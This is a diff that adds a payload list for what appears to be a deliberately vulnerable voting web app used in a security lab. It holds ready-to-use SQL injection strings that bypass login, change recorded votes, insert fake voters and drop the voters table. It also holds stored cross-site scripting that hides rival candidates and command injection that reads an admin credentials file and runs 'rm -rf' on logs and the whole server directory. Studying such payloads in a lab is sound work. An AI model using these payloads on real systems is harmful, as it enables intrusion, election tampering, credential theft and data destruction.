@@ -1,0 +1,35 @@
+---------- SQL Injection ----------
+# Login page
+username: admin
+password: ' OR '1'='1
+
+# Search voters page
+Normal: V105
+Retrieve all voters: ' OR '1'='1
+Update a voter's vote: V105'; UPDATE voters SET vote_casted='Candidate C' WHERE voter_id='V105'; --
+Add a fake voter: V105'; INSERT INTO voters (name, voter_id, vote_casted) VALUES ('Hacker', 'V999', 'Candidate X'); --
+Drop the voters table: V105'; DROP TABLE voters; --
+
+
+---------- Cross Site Scripting ----------
+# Add candidate page
+name: Cuong
+description:
+A young visionary leader.
+<script>alert('Cuong is the best candidate!');</script>
+<script>document.querySelector('h2').innerText = 'Cuong is the best candidate!';</script>
+<script>document.querySelectorAll('.card').forEach(card => { if (!card.innerHTML.includes('Cuong')) { card.style.display = 'none'; } });</script>
+
+# Voting page
+View the attack result
+
+
+---------- Command Injection ----------
+# System log page
+Normal: system.log
+View sentitive data: system.log && cat account/admin.txt
+
+# Generate report page
+Normal: report.txt
+Deleting critical files: report.txt && rm -rf logs/
+Destroy the server: report.txt && rm -rf *
